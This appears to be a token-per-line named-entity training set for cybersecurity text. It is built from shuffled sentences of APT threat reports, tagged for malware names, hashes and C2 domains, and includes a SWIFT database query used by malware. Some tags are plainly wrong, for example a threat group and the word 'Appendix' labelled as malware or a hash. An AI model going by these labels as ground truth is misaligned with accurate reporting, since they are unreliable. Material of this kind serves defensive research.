wallet O
file O
names O
in O
Chinese O
on O
victims O
' O
workstations O
. O

netstat O
-ano O
- O
displays O
protocols O
statistics O
and O
current O
TCP/IP O
network O
connections O

The O
file O
sarbajit_leaked_video.wmv.scr O
contains O
a O
compile O
time O
of O
May O
28 O
, O
2013 O
19:53:26 O
UTC O
. O

However O
, O
analysis O
indicated O
that O
some O
files O
were O
still O
intact O
after O
the O
malware O
's O
write O
operations O
and O
subsequent O
system O
reboot O
. O

BootXLoader O
: O
is O
the O
main O
module O
that O
handles O
the O
initialization O
procedures O
. O

' O
Bennett O
, O
Cory O
. O

We O
have O
associated O
this O
campaign O
with O
APT19 B-malware.infosteal
, O
a O
group O
that O
we O
assess O
is O
composed O
of O
freelancers O
, O
with O
some O
degree O
of O
sponsorship O
by O
the O
Chinese O
government O
. O

On O
this O
occasion O
, O
the O
server O
side O
code O
was O
publicly O
accessible O
, O
allowing O
us O
to O
gain O
insights O
into O
the O
development O
and O
testing O
phase O
of O
an O
attack O
using O
ScanBox B-malware.infosteal
. O

Contact O
Us O
Communication O
Preferences O
Report O
Security O
Issue O
Supplier O
Documents O
Legal O
Documentation O
Twitter O
Google+ O
YouTube O
Podcast O
LinkedIn O
Facebook O
877­FIREEYE O
( O
877­347­3393 O
) O
Glassdoor O
Copyright O
© O
2016 O
FireEye O
, O
Inc O
. O

Once O
the O
malware O
has O
sent O
the O
information O
about O
the O
host O
configuration O
to O
the O
C2 O
, O
it O
will O
download O
another O
file O
, O
' O
upnphost.exe O
' O
, O
stored O
in O
the O
path O
' O
% O
APPDATA O
% O
\Local\Temp O
' O
that O
probably O
is O
the O
final O
payload O
. O

Image O
of O
a O
section O
of O
a O
configuration O
file O
for O
the O
FinSpy B-malware.backdoor
Mobile O
sample O

may O
be O
exploited O
to O
allow O
unauthorized O
access O
to O
sensitive O
information O
. O

After O
performing O
this O
swap O
operation O
, O
DarkComet B-malware.backdoor
finally O
decrypts O
a O
byte O
of O
message O
. O

Typically O
, O
such O
threats O
take O
an O
alarmingly O
long O
time O
to O
detect O
and O
eliminate O
, O
often O
more O
than O
a O
year O
. O

7 O
당시 O
해당 O
ERP O
솔루션을 O
사용하는 O
모든 O
업체가 O
아니라 O
특정한 O
공격 O
대상 O
인 O
기업에만 O
악성코드가 O
다운로드되었다 O
. O

This O
C2 B-malware.backdoor
scheme O
would O
seem O
to O
dictate O
: O
Intruder O
remote O
access O
to O
the O
' O
master O
' O
system O
Intruder O
local O
access O
to O
the O
' O
master O
' O
system O
a O
C2 B-malware.backdoor
delivery/retrieval O
component O
, O
such O
as O
another O
piece O
of O
code O
that O
downloads O
a O
C2 B-malware.backdoor
file O
Available O
information O
precludes O
determination O
of O
the O
means O
of O
exfiltration O
. O

Service O
names O
also O
can O
differ O
from O
version O
to O
version O
; O
we O
discovered O
the O
following O
names O
-- O
DriverManage O
, O
WebService O
and O
WebClientManager O
. O

cortana-scripts O
metasploit-loader O
malleable-c2-profiles O
layer2-privoting-client O
armitage O

On O
top O
of O
this O
, O
they O
ignored O
Android O
's O
warnings O
about O
downloading O
apps O
from O
unknown O
sources O
. O

The O
server O
also O
hosts O
a O
copy O
of O
the O
obfuscated O
PowerShell O
implant O
. O

IDS O
signatures O
similar O
to O
the O
one O
illustrated O
in O
the O
Detect O
section O
should O
be O
used O
to O
detect O
inbound O
exploit O
attempts O
, O
and O
machines O
accepting O
this O
data O
should O
be O
scanned O
for O
potential O
infections O
. O

Date O
first O
seen O
Primary O
C O
& O
C O

We O
can O
speculate O
that O
we O
have O
two O
different O
samples O
, O
then O
we O
were O
able O
to O
extract O
2 O
files O
from O
the O
second O
family O
: O
a O
classic O
' O
.lnk O
' O
file O
and O
a O
' O
jpg O
' O
file O
. O

After O
the O
four O
byte O
integer O
that O
represents O
the O
size O
, O
the O
fi O
rst O
byte O
of O
the O
packet O
payload O
contains O
an O
operation O
code O
. O

Currently O
, O
the O
IRGC O
is O
Iran O
's O
premier O
security O
organization O
and O
possesses O
an O
army O
, O
navy O
, O
and O
air O
force O
, O
and O
manages O
' O
Iran O
's O
ballistic O
missile O
arsenal O
and O
irregular O
warfare O
operations O
through O
its O
elite O
Quds O
Force O
and O
proxies O
such O
as O
Hezbollah O
. O
' O

On O
many O
occasions O
, O
both O
the O
dropper O
and O
the O
payload O
will O
contain O
a O
range O
of O
techniques O
to O
ensure O
the O
sample O
is O
not O
being O
analyzed O
on O
a O
virtual O
machine O
, O
using O
a O
debugger O
, O
or O
located O
within O
a O
sandbox O
. O

FireEye O
has O
not O
connected O
this O
activity O
to O
any O
actor O
we O
currently O
track O
; O
however O
, O
we O
assess O
with O
moderate O
confidence O
that O
the O
actor O
is O
sponsored O
by O
a O
nation O
state O
. O

This O
functionality O
allows O
the O
attackers O
to O
delete O
their O
footprints O
on O
the O
system O
. O

Our O
firm O
of O
cybersecurity O
experts O
, O
staffed O
by O
veterans O
from O
the O
United O
States O
Department O
of O
Defense O
, O
identified O
suspicious O
activity O
within O
one O
of O
our O
client O
's O
networks O
; O
a O
threat O
which O
on O
closer O
inspection O
bore O
the O
unique O
signature O
of O
a O
group O
of O
Russian O
hackers O
well-known O
in O
the O
cyber-security O
industry O
. O

Generic O
buffer O
overflow O
protection O
is O
expected O
to O
cover O
some O
, O
but O
not O
all O
, O
exploits O
. O

The O
Base64-encoded O
parameters O
z1 O
and O
z2 O
are O
highlighted O
in O
the O
following O
output O
: O

NATO O
, O
Afghan O
Ministry O
of O
Foreign O
Affairs O
, O
Pakistani O
Military O
JULY O
2015 O
APT28 B-malware.infosteal
used O
two O
domains O
( O
nato-news.com B-url.unknown
and O
bbc-news.org B-url.unknown
) O
to O
host O
an O
Adobe O
Flash O
zero-day O
exploit O
to O
target O
NATO O
, O
the O
Afghan O
Ministry O
of O
Foreign O
Affairs O
, O
and O
the O
Pakistani O
military O
. O

Here O
is O
a O
table O
with O
the O
minimal O
information O
about O
46 O
different O
samples O
: O

Below O
screen O
shots O
show O
the O
code O
that O
is O
performing O
the O
C2 O
connection O
and O
the O
validation O
. O

Additional O
thanks O
to O
Bill O
Marczak O
, O
Byron O
Sonne O
, O
Adam O
Senft O
, O
and O
Ron O
Deibert O
. O

Over O
the O
last O
several O
months O
, O
we O
have O
encountered O
a O
large O
number O
of O
DarkComet B-malware.backdoor
samples O
, O
numbering O
well O
over O
a O
thousand O
. O

f O
: O
\F\Windows O
Work\G1\Adeel O
's O
Laptop\G1 O
Main O
Virus\systemInterrupts\gravity\obj\x86\Debug\systemInterrupts.pdb O

The O
second O
resource O
, O
0x000B O
, O
contains O
as O
its O
payload O
an O
XML O
file O
with O
instructions O
for O
the O
dropper O
on O
where O
to O
install O
the O
dropped O
components O
and O
what O
to O
name O
them O
. O

안다리엘 O
그룹의 O
공격 O
사례에서 O
확인한 O
것처럼 O
기업 O
및 O
기관의 O
중앙관리 O
솔루션 O
또한 O
언제든 O
공격의 O
경로 O
가될수 O
있다 O
. O

Similarly O
, O
WATERSPOUT B-malware.backdoor
is O
a O
newly O
discovered O
backdoor O
and O
the O
threat O
actors O
behind O
the O
campaign O
have O
not O
been O
positively O
identified O
. O

c. O
Update O
download O
counter O
: O
Runs O
a O
counter O
script O
by O
opening O
http://myadmin2012.com/tong.htm B-url.unknown
. O

C O
: O
WindowsSystem32 O
directory O
: O

In O
terms O
of O
architecture O
, O
the O
platform O
used O
to O
create O
Duqu B-malware.infosteal
and O
Stuxnet B-malware.backdoor
is O
the O
same O
. O

Finally O
, O
this O
geo-location O
supports O
the O
likely O
theory O
that O
the O
attackers O
behind O
Kimsuky B-malware.drop
are O
based O
in O
North O
Korea O
. O

97576FA7A236679DBE3ABE1A4E852026 B-hash
mjed10.no-ip.info B-url.cncsvr

Code O
in O
their O
custom O
malware O
bore O
similarities O
, O
for O
instance O
. O

Following O
on O
from O
our O
previous O
post O
on O
ScanBox B-malware.infosteal
, O
we O
have O
watched O
the O
clusters O
of O
activity O
outlined O
with O
close O
interest O
, O
as O
well O
as O
keeping O
an O
eye O
on O
new O
adopters O
of O
the O
ScanBox B-malware.infosteal
framework O
. O

MARCH O
– O
NOVEMBER O
2016 O

Much O
like O
Darwin O
's O
theory O
of O
biological O
evolution O
, O
APT12 O
been O
forced O
to O
evolve O
and O
adapt O
in O
order O
to O
maintain O
its O
mission O
. O

Appendix O
A O
: O
Snort O
rules O
11 O
. O

We O
observe O
the O
' O
retranslator O
' O
code O
, O
or O
ProcessRetranslator.dll O
, O
currently O
being O
delivered O
to O
systems O
without O
the O
presence O
of O
the O
previous O
, O
large O
, O
SPLM B-malware.backdoor
code O
and O
injection O
capabilities O
. O

This O
creates O
basic O
blocks O
with O
no O
parents O
. O

Hence O
there O
are O
very O
few O
noticeable O
traces O
of O
ramFS O
during O
its O
use O
. O

One O
sample O
we O
dug O
from O
the O
malware O
zoo O
has O
also O
been O
spotted O
in O
various O
regions O
in O
Asia O
. O

Non-profit O
organization O
Sale O
of O
drugs O
T O
ravel/maps O
Resources O
based O
on O
the O
Bump O
platform O
( O
platform O
for O
corporate O
social O
networks O
) O
– O
non-profit O
organization O
, O
social O
network O
for O
college/university O
alumni O
, O
communication O
platform O
for O
NGOs O
, O
etc O
. O

As O
a O
result O
of O
replacing O
the O
original O
sshd O
file O
with O
a O
modified O
one O
on O
the O
infected O
server O
, O
an O
attacker O
can O
use O
a O
' O
master O
password O
' O
to O
get O
authorized O
on O
the O
remote O
server O
, O
while O
leaving O
minimal O
traces O
( O
compared O
to O
an O
ordinary O
user O
connecting O
via O
ssh O
) O
. O

The O
campaign O
has O
a O
high O
chance O
of O
success O
against O
victims O
who O
have O
an O
unpatched O
version O
of O
Flash O
. O

They O
scout O
for O
vulnerable O
practices O
, O
susceptible O
systems O
and O
operational O
loopholes O
that O
they O
can O
leverage O
or O
abuse O
. O

The O
problem O
relies O
on O
the O
fact O
that O
the O
' O
.key O
' O
and O
' O
.value O
' O
members O
are O
used O
as O
indexes O
without O
any O
kind O
of O
boundary O
checks O
. O

Figure O
10 O
: O
decode_string O
routine O

search/ O
? O
, O
find/ O
? O
, O
results/ O
? O
, O
open/ O
? O
, O
search/ O
? O
, O
close/ O
? O

Here O
are O
the O
main O
characteristics O
that O
can O
help O
profile O
the O
threat O
actor O
: O

Over O
the O
course O
of O
a O
little O
over O
a O
week O
, O
malware O
delivered O
from O
winrar.it B-url.normal
appeared O
on O
over O
600 O
systems O
throughout O
Europe O
and O
Northern O
Africa/Middle O
East O
. O

If O
unlabeled O
textbox1 O
is O
a O
local O
file O
on O
infected O
system O
, O
the O
file O
is O
read O
and O
displayed O
to O
attacker O
. O

At O
this O
point O
, O
the O
startup O
sequence O
for O
Derusbi B-malware.backdoor
is O
complete O
and O
the O
server O
variant O
moves O
into O
a O
communication O
and O
command O
dispatch O
phase O
. O

To O
illustrate O
the O
complexity O
of O
these O
lures O
, O
Figure O
4 O
shows O
the O
creation O
of O
persistence O
mechanisms O
for O
recovered O
APT32 B-malware.infosteal
lure O
' O
2017 O
.doc O
' O
. O

' O
Pelosi O
, O
Nancy O
. O

However O
, O
the O
configuration O
was O
still O
stored O
embedded O
in O
the O
binary O
. O

Umbrella O
, O
our O
secure O
internet O
gateway O
( O
SIG O
) O
, O
blocks O
users O
from O
connecting O
to O
malicious O
domains O
, O
IPs O
, O
and O
URLs O
, O
whether O
users O
are O
on O
or O
off O
the O
corporate O
network O
. O

If O
you O
compare O
the O
HTTP O
GET O
request O
from O
the O
RIPTIDE B-malware.backdoor
samples O
( O
Figure O
1 O
) O
to O
the O
HTTP O
GET O
request O
from O
the O
HIGHTIDE B-malware.backdoor
samples O
( O
Figure O
3 O
) O
you O
can O
see O
the O
malware O
author O
changed O
the O
following O
items O
: O
User O
Agent O
Format O
and O
structure O
of O
the O
HTTP O
Uniform O
Resource O
Identifier O
( O
URI O
) O

Fake O
DLL O
: O
goopdate.dll O
( O
973b1ca8661be6651114edf29b10b31db4e218f7 B-hash
) O

Screen O
Grabbing O
and O
Keylogging O

Then O
something O
happens O
that O
throws O
this O
picture O
in O
disarray O
. O

T O
able O
1.Co O
m O
pr O
o O
m O
ise O
d O
se O
r O
ve O
rsT O
able O
1.Co O
m O
pr O
o O
m O
ise O
d O
se O
r O
ve O
r O
s O
Co O
unt O
r O
y O
Co O
unt O
r O
y O
De O
scr O
ipt O
io O
n O
De O
scr O
ipt O
io O
n O
Ro O
le O
in O
t O
he O
at O
t O
ack O
Ro O
le O
in O
t O
he O
at O
t O
ack O

' O
HT O
Srl O
' O
Certificate O
Details O
: O
Status O
: O
Revoked O

iDefense O
analysts O
have O
identified O
a O
campaign O
likely O
to O
be O
targeting O
members O
of O
or O
those O
with O
affiliation O
or O
interest O
in O
the O
ASEAN O
Defence O
Minister O
's O
Meeting O
( O
ADMM O
) O
. O

The O
logged O
keystrokes O
are O
then O
sent O
back O
to O
the O
C O
& O
C O
and O
saved O
to O
. O

Ransomware O
101 O
This O
infographic O
shows O
how O
ransomware O
has O
evolved O
, O
how O
big O
the O
problem O
has O
become O
, O
and O
ways O
to O
avoid O
being O
a O
ransomware O
victim O
. O

A O
few O
days O
after O
, O
the O
operator O
stopped O
answering O
in O
the O
chat O
room O
, O
and O
her O
user O
account O
was O
deleted O
from O
the O
server O
. O

Fake O
feedreader O
SHA256 O
: O

T O
he O
diagram O
below O
shows O
times O
of O
illegitimate O
logons O
to O
one O
of O
the O
compromised O
servers O
during O
one O
month O
. O

The O
mapped O
object O
contains O
name O
and O
path O
to O
the O
malicious O
DLL O
, O
the O
name O
of O
the O
pipe O
being O
used O
for O
communication O
between O
the O
instances O
, O
the O
name O
of O
the O
export O
from O
the O
DLL O
to O
be O
called O
as O
well O
as O
information O
about O
instances O
already O
running O
. O

The O
list O
of O
keywords O
, O
in O
base64 O
format O
, O
is O
retrieved O
from O
the O
command O
and O
control O
server O
as O
a O
text O
file O
. O

After O
this O
initial O
activity O
, O
the O
attackers O
usually O
downloaded O
more O
of O
their O
tools O
to O
the O
computer O
using O
a O
PowerShell O
downloader O
and O
began O
moving O
across O
the O
victim O
's O
network O
. O

As O
soon O
as O
smtXX.tmp O
is O
finished O
being O
written O
to O
disk O
, O
a O
file O
( O
1431XXXXXXXX.dat O
) O
is O
written O
, O
roughly O
the O
same O
size O
as O
smtXX.tmp O
. O

2015년부터 O
2017년 O
사이에 O
발견된 O
변형은 O
서버 O
IP O
, O
타깃 O
시스템 O
IP O
, O
다운로드 O
주소 O
, O
원격 O
실행 O
파일 O
경로 O
등을 O
인자로 O
받아 O
취약점 O
공격에 O
성공한 O
시스템 O
상에서 O
악성코드를 O
다운로드하는 O
스크립트 O
파일을 O
생성 O
한다 O
. O

Kaspersky O
Lab O
products O
detect O
the O
different O
artifacts O
used O
in O
this O
campaign O
with O
the O
following O
verdicts O
: O
T O
rojan.Win32.Generic O
, O
T O
rojan-Downloader.Win32.Upatre O
and O
Backdoor.Win32.HyperBro O
. O

Adding O
in O
their O
creative O
waterholing B-malware.backdoor
and O
poisoned O
installer O
tactics O
, O
we O
describe O
the O
StrongPity O
APT O
as O
not O
only O
determined O
and O
well-resourced O
, O
but O
fairly O
reckless O
and O
innovative O
as O
well O
. O

It O
's O
important O
to O
note O
that O
, O
attack O
capabilities O
can O
be O
widely O
distributed O
if O
attackers O
take O
full O
advantages O
of O
certain O
technology O
, O
especially O
computer O
technology O
can O
make O
attack O
more O
powerful O
and O
automated O
. O
' O

ZKM O
obfuscates O
the O
code O
by O
giving O
it O
generic O
class O
, O
method O
, O
and O
variable O
names O
, O
it O
also O
encodes O
the O
strings O
by O
xoring O
them O
with O
a O
series O
of O
random O
bytes O
, O
and O
includes O
extraneous O
code-paths O
. O

.مداقلا O
نيطسلف O
ةلود O
سيئر O
) O
نلاحد O
دمحم O
( O
تاريدقتو O
ليلحت O

It O
's O
an O
attempt O
to O
muddy O
the O
waters O
for O
the O
analysts/researchers O
to O
direct O
blame O
elsewhere O
. O

During O
initialization O
Babar B-malware.drop
loads O
and O
decrypts O
a O
set O
of O
configuration O
parameters O
which O
are O
appended O
to O
the O
DLL O
's O
relocation O
section O
. O

Di O
Amato O
alleges O
that O
his O
law O
firm O
's O
website O
has O
been O
the O
victim O
of O
several O
DDoS O
attacks O
, O
which O
he O
believes O
are O
linked O
to O
his O
litigation O
involving O
the O
government O
of O
Kazakhstan O
. O

The O
following O
paper O
is O
a O
technical O
analysis O
on O
the O
functionality O
of O
ZxShell B-malware.backdoor
. O

[ O
Israeli O
MFA O
] O
questionnaire O
- O
URGENT O
– O
An O
original O
paper O
, O
probably O
stolen O
in O
previous O
attacks O
. O

Unfortunately O
for O
xtremecoder O
, O
the O
source O
code O
has O
been O
leaked O
online O
. O

? O
\Parameters\ O

The O
implementation O
is O
quite O
simple O
: O
After O
the O
handshake O
, O
2 O
threads O
that O
deal O
with O
data O
transfer O
are O
spawned O
. O

As O
the O
latest O
revision O
of O
the O
backdoor O
, O
portions O
of O
SPLM B-malware.backdoor
did O
n't O
match O
previous O
reports O
on O
SPLM/XAgent B-malware.backdoor
while O
other O
similarities O
were O
maintained O
. O

Malicious O
Domain O
/ O
IP O
: O
blog.versign(.)info B-url.cncsvr

The O
main O
PowerShell O
file O
invoker.ps1 O
uses O
these O
components O
to O
run O
the O
final O
payload O
, O
PRB-Backdoor B-malware.backdoor
, O
previously O
analyzed O
by O
other O
security O
researchers O
in O
May O
2018 O
. O

An O
analysis O
of O
this O
arsenal O
shows O
that O
the O
attackers O
went O
out O
of O
their O
way O
to O
restore O
the O
PowerShell-based O
infrastructure O
, O
even O
though O
it O
had O
already O
been O
detected O
and O
shut O
down O
once O
. O

Figure O
28 O
. O

These O
commands O
are O
briefly O
described O
in O
Table O
2 O
( O
overleaf O
) O
. O

This O
may O
be O
used O
to O
load O
additional O
downloaded O
components O
of O
the O
attack O
. O

The O
reply O
from O
the O
active O
command O
and O
control O
server O
can O
be O
seen O
in O
Figure O
6 O
: O

When O
applied O
to O
the O
hex O
data O
following O
it O
, O
we O
get O
the O
decrypted O
data O
below O
, O
which O
contains O
the O
MAC O
Address O
, O
hostname O
, O
and O
campaign O
code O
. O

Babar B-malware.drop
is O
a O
fully O
blown O
espionage O
tool O
, O
built O
to O
excessively O
spy O
on O
the O
user O
's O
activity O
on O
an O
infected O
machine O
. O

vulnerabilities O
, O
sophisticated O
During O
the O
end O
of O
April O
2015 O
, O
root9B O
analysts O
were O
conducting O
routine O
security O
analysis O
to O
explore O
and O
discover O
new O
and O
emerging O
cyber O
threats O
. O

The O
Svchost O
group O
registry O
key O
HKLM\SOFTWARE\Microsoft\Windows O
NT\CurrentVersion\SvcHost O
is O
opened O
and O
the O
netsvc O
group O
value O
data O
is O
queried O
to O
generate O
a O
name O
for O
the O
service O
. O

The O
choice O
of O
the O
Russian O
language O
character O
set O
in O
the O
application O
further O
underscores O
the O
targeting O
of O
forces O
within O
eastern O
Ukraine O
, O
as O
Russian O
is O
the O
predominant O
language O
utilized O
in O
that O
region O
. O

Given O
how O
cybercriminal O
tools O
, O
tactics O
and O
procedures O
are O
evolving O
, O
organizations O
will O
have O
to O
go O
beyond O
their O
typical O
day-to-day O
security O
requirements O
and O
find O
a O
way O
to O
preempt O
attacks O
. O

국회의원실 O
사칭한 O
메일이 O
다운로드하는 O
악성코드는 O
2017년 O
ATM O
해킹에 O
사용된 O
악성코드의 O
변형으로 O
, O
또 O
다른 O
변형이 O
6월 O
금융권 O
공격에도 O
사용되었다 O
. O

This O
continues O
to O
suggest O
that O
intruders O
either O
have O
local O
or O
remote O
access B-malware.backdoor
to I-malware.backdoor
headquarters I-malware.backdoor
systems I-malware.backdoor
running O
netsat.exe O
or O
access O
to O
another O
application O
that O
automates O
remote O
C2 O
data/file O
retrieval O
. O

These O
solutions O
are O
powered O
by O
the O
Trend O
Micro O
XGenTM O
security O
, O
which O
provides O
a O
cross-generational O
blend O
of O
threat O
defense O
techniques O
against O
a O
full O
range O
of O
threats O
for O
data O
centers O
, O
cloud O
environments O
, O
networks O
, O
and O
endpoints O
. O

Targeting O
in O
arabic O

However O
, O
it O
looks O
convincing O
enough O
to O
pass O
cursory O
inspection O
, O
i.e. O
, O
the O
format O
appears O
legitimate O
and O
the O
appearance O
does O
not O
engender O
suspicion O
. O

이는 O
실행 O
파일이 O
다운로드 O
될 O
때 O
행위 O
기반 O
보안 O
솔루션에 O
의해 O
탐지되는 O
것을 O
피하기 O
위한 O
목적으로 O
보인다 O
. O

In O
this O
blog O
we O
describe O
a O
sophisticated O
backdoor O
, O
called O
Dino B-malware.backdoor
by O
its O
creators O
. O

The O
original O
filename O
of O
the O
sample O
was O
resume.exe O
. O

These O
attacks O
have O
been O
ongoing O
for O
at O
least O
a O
year O
; O
seemingly O
first O
focused O
on O
Palestinians O
, O
then O
Israelis O
. O

Web O
based O
RAT B-malware.unknown
control O
panels O
found O
on O
Operation B-malware.ransom
Manul I-malware.ransom
C2 O
Servers O
Fig O
12 O
. O

We O
must O
consider O
that O
these O
domains O
could O
have O
been O
used O
by O
other O
actors O
over O
this O
time O
period O
. O

showBackupIosFolder O

Perhaps O
the O
most O
interesting O
aspect O
of O
the O
Snake O
Wine O
group O
is O
the O
number O
of O
techniques O
used O
to O
obscure O
attribution O
. O

The O
RAT O
is O
available O
for O
free O
; O
however O
, O
the O
developer O
charges O
350 O
Euros O
for O
the O
source O
code O
. O

The O
capability O
of O
the O
malware O
includes O
gaining O
access O
to O
contacts O
, O
Short O
Message O
Service O
( O
SMS O
) O
text O
messages O
, O
call O
logs O
, O
and O
internet O
data O
, O
and O
FANCY O
BEAR O
would O
likely O
leverage O
this O
information O
for O
its O
intelligence O
and O
planning O
value O
. O

Sofacy O
attackers O
had O
recorded O
a O
previous O
Grey O
Lambert O
remote O
session O
and O
replayed O
the O
communication O
after O
discovering O
this O
host O
, O
essentially O
compromising O
the O
Grey O
Lambert O
module O
on O
the O
system O
to O
gain O
access O
and O
later O
injecting O
SPLM B-malware.backdoor
modules O
2 O
. O

dwTotalPacketSize O
field O
defines O
the O
total O
size O
of O
the O
datagram O
including O
both O
the O
size O
of O
the O
header O
and O
the O
size O
of O
the O
optional O
payload O
. O

ADEX는 O
1996년부터 O
격년으로 O
진행되는 O
국제 O
방위산업 O
전시회이다 O
. O

Indicates O
error O
copying O
netwi.drv O
to O
~disk.ini O
. O

According O
to O
Insikt O
Group O
's O
source O
, O
Tajik O
's O
father O
maintained O
a O
strong O
religious O
background O
and O
was O
a O
veteran O
of O
Iran O
's O
ministry O
of O
intelligence O
. O

Crash101.dll O
Crash O

The O
following O
diagram O
shows O
the O
links O
in O
tools O
and O
targets O
between O
the O
groups O
discussed O
in O
our O
previous O
blog O
, O
but O
newer O
information O
has O
since O
come O
to O
light O
which O
allows O
us O
to O
more O
accurately O
associate O
these O
groups O
with O
known O
threat O
actors O
: O
Between O
these O
clusters O
, O
we O
've O
seen O
strategic O
web O
compromises O
designed O
to O
target O
users O
in O
the O
following O
countries O
: O

These O
individuals O
have O
been O
grouped O
within O
PalantirTM O
as O
' O
technical O
support O
for O
bot O
' O
at O
location O
5 O
. O

The O
will O
attempt O
to O
open O
a O
handle O
to O
the O
driver O
( O
if O
it O
is O
already O
installed O
) O
by O
calling O
CreateFile O
with O
the O
filename O
of O
\Device\ O
{ O
93144EB0-8E3E-4591-B307-8EEBFE7DB28F O
} O
. O

Appendix B-hash
A O
Indicators O
of O
Compromise O

Development O
and O
Distribution O
CrowdStrike O
has O
discovered O
indications O
that O
as O
early O
as O
2015 O
FANCY O
BEAR O
likely O
developed O
X-Agent B-malware.infosteal
applications O
for O
the O
iOS O
environment O
, O
targeting O
' O
jailbroken O
' O
Apple O
mobile O
devices O
. O

A O
vast O
array O
of O
components O
was O
implemented O
in O
the O
malware O
including O
four O
0-Day O
exploits O
, O
a O
windows O
rootkit O
, O
antivirus O
evasion O
techniques O
, O
complex O
process O
injection O
and O
hooking O
code O
, O
network O
infection O
routines O
, O
peer-to-peer O
updates O
, O
a O
command O
and O
control O
interface O
, O
as O
well O
as O
the O
first O
ever O
PLC O
rootkit O
. O

When O
the O
victim O
opens O
the O
attached O
excel O
file O
it O
prompts O
the O
user O
to O
enable O
macro O
content O
as O
shown O
in O
the O
below O
screen O
shot O
. O

Libyan B-malware.infosteal
Scorpions I-malware.infosteal
threat O
actors O
used O
a O
set O
of O
methods O
to O
hide O
and O
operate O
their O
malwares O
. O

The O
URL O
used O
by O
Cmstar B-malware.unknown
to O
communicate O
with O
its O
C2 O
server O
, O
as O
well O
as O
significant O
infrastructure O
overlap O
, O
show O
a O
direct O
relationship O
between O
the O
Cmstar B-malware.unknown
downloader O
, O
Lurid/Enfal B-malware.unknown
and O
Cmwhite B-malware.unknown
tools O
. O

This O
simple O
encoding O
takes O
the O
most O
significant O
nibble O
for O
each O
character O
, O
swaps O
the O
nibbles O
of O
that O
byte O
, O
and O
xors O
the O
result O
against O
the O
original O
value O
. O

SELECT O
MESG_S_UMID O
FROM O
SAAOWNER.MESG_%s O
WHERE O
MESG_SENDER_SWIFT_ADDRESS O
LIKE O
' O
% O
% O
% O
s O
% O
% O
' O
AND O
MESG_FIN_CCY_AMOUNT O
LIKE O
' O
% O
% O
% O
s O
% O
% O
' O
; O

Value O
: O
SysIns O

Once O
the O
new O
victim O
click O
on O
the O
APK O
file O
, O
the O
application O
installs O
itself O
in O
the O
device O
without O
any O
problem O
and O
is O
fully O
functional O
. O

Consequently O
, O
the O
attacker O
contacted O
us O
, O
trying O
to O
learn O
what O
we O
know O
about O
him O
. O

However O
, O
we O
did O
find O
Duqu B-malware.infosteal
files O
. O

Beginning O
in O
2016 O
, O
researchers O
discovered O
a O
shift O
in O
North O
Korean O
operations O
toward O
attacks O
against O
financial O
institutions O
designed O
to O
steal O
money O
and O
generate O
funds O
for O
the O
Kim O
regime O
. O

00 O
00 O
b9 O
? O
? O

For O
the O
binary O
mathematically O
impaired O
like O
myself O
the O
4-byte O
keys O
will O
eventually O
repeat O
in O
effect O
creating O
a O
256-byte O
XOR O
key O
. O

When O
running O
on O
Windows O
7 O
, O
the O
malicious O
library O
uses O
the O
Metasploit O
Framework O
's O
open-source O
code O
Win7Elevate O
to O
inject O
malicious O
code O
into O
explorer.exe O
. O

The O
functionality O
of O
this O
part O
of O
script O
is O
: O
decrypting O
the O
encrypted O
content O
of O
base64 O
, O
decompressing O
with O
Gzip O
, O
resulting O
in O
module O
1 O
and O
using O
PowerShell O
to O
download O
and O
execute O
. O

Intelligence O
analysts O
may O
want O
to O
use O
the O
information O
provided O
in O
this O
IA O
to O
better O
inform O
their O
own O
analyses O
. O

% O
SYSDIR O
% O
\Drivers\ O
{ O
93144EB0-8E3E-4591-B307-8EEBFE7DB28F O
} O
.sys O
. O

On O
April O
18 O
, O
2018 O
, O
as O
soon O
as O
360 O
Core O
Security O
detected O
the O
malicious O
activity O
, O
we O
contacted O
Microsoft O
without O
any O
delay O
and O
submitted O
relevant O
details O
to O
Microsoft O
. O

Related O
Malware O
Samples O
associated O
with O
C2 O
( O
khanji[.]ddns[.]net B-url.cncsvr
) O
: O

At O
runtime O
this O
object O
is O
deserialized O
and O
stored O
inside O
the O
CORE O
module O
. O

However O
, O
we O
believe O
the O
' O
public O
release O
' O
date O
is O
still O
a O
good O
metric O
, O
because O
it O
is O
the O
moment O
at O
which O
all O
the O
other O
security O
companies O
and O
the O
entire O
world O
are O
made O
aware O
of O
these O
threats O
. O

APT28 B-malware.backdoor
actors O
relied O
heavily O
on O
shortened O
URLs O
in O
their O
spearphishing O
email O
campaigns O
. O

이 O
문서 O
파일은 O
수신자가 O
본문을 O
확인하는데 O
별다른 O
어려움이 O
없어 O
매크로를 O
활성화하지 O
않았을 O
가능성이 O
있다 O
. O

5a9547b727f0b4baf9b379328c797005 B-hash
Server O
Platino8 O

IOCS O
: O

For O
threat O
hunting O
, O
iDefense O
also O
suggests O
that O
analysts O
to O
look O
for O
the O
following O
artifacts O
: O
A O
value O
named O
IAStorD O
in O
the O
autorun O
key O
A O
file O
named O
FXSAPIDebugLogFile.tmp O
A O
mutex O
handle O
named O
donotbotherme O
thumbcache_1CD60.db O
in O
AppData\Local\Microsoft\Windows\Explorer\ O
For O
further O
information O
regarding O
the O
Microsoft O
Security O
Update O
KB25533204 O
, O
please O
visit O
: O
https://support.microsoft.com/en-us/help/2553204/description-of-the-security-update-for-office-2010-november-14-2017 B-url.normal
Given O
the O
inherent O
nature O
of O
threat O
intelligence O
, O
the O
content O
contained O
in O
this O
alert O
is O
based O
on O
information O
gathered O
and O
understood O
at O
the O
time O
of O
its O
creation O
. O

We O
discovered O
that O
the O
embedded O
macro O
is O
quite O
small O
when O
extracted O
. O

Hacquebord O
Feike O
. O

We O
'll O
cover O
more O
recent O
2018 O
change O
in O
their O
targeting O
and O
the O
malware O
itself O
at O
SAS O
2018 O
. O

The O
binary O
's O
original O
name O
, O
' O
Dino.exe O
' O
, O
has O
been O
left O
visible O
by O
its O
authors O
, O
as O
was O
the O
case O
with O
Casper B-malware.unknown
. O

ToString O
( O
) O
; O
ACTION O
= O
' O
REGISTER O
' O
; O
} O
Ability O
to O
take O
screenshots O
. O

Together O
, O
we O
tried O
to O
build O
a O
list O
of O
features O
that O
we O
could O
use O
to O
make O
a O
YARA O
rule O
to O
detect O
both O
ExPetr O
and O
BlackEnergy O
wipers O
. O

The O
C O
& O
C O
will O
reply O
if O
it O
accepts O
the O
connection O
. O

3 O
Nov O
. O

It O
seems O
likely O
that O
the O
names O
used O
were O
crafted O
to O
make O
it O
look O
like O
the O
document O
came O
from O
the O
Department O
of O
Information O
and O
Communications O
Technology O
( O
DICT O
) O
, O
or O
possibly O
from O
the O
Service O
Director O
, O
which O
would O
imply O
that O
the O
employees O
of O
the O
Department O
of O
Foreign O
